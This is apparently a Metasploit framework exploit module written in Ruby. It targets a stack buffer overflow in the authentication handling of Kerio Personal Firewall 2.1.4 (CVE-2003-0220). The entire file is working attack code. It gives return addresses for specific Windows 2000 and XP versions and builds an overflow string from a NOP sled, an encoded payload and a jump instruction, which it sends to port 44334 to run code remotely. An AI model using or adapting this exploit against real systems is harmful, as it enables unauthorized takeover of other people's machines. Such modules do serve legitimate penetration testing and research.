require 'msf/core'

module Msf

class Exploits::Windows::Firewall::Kerio_Auth < Msf::Exploit::Remote

	include Exploit::Remote::Tcp


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Kerio Firewall 2.1.4 Authentication Packet Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in Kerio Personal Firewall 
				administration authentication process. This module has only been tested 
				against Kerio Personal Firewall 2 (2.1.4).

			},
			'Author'         => 'MC',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 1.0 $',
			'References'     => 
				[ 
					['BID', '7180'],
					['CVE', '2003-0220'],
					['URL', 'http://www1.corest.com/common/showdoc.php?idx=314&idxseccion=10'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec68b } ],
					[ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77e3171b } ],
					[ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77dc5527 } ], 
				],

			'Privileged'     => true,

			'DisclosureDate' => 'April 28 2003',

			'DefaultTarget' => 0))

			register_options(
				[
					Opt::RPORT(44334)
				], self.class)

	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		sploit  = make_nops(4268)
		sploit += payload.encoded
		sploit += [target.ret].pack('V')
		sploit += "\xe9\x0b\xfe\xff\xff"

		sock.put(sploit)
		sock.get_once(-1, 3)
		
		handler
		disconnect
	end

end
end
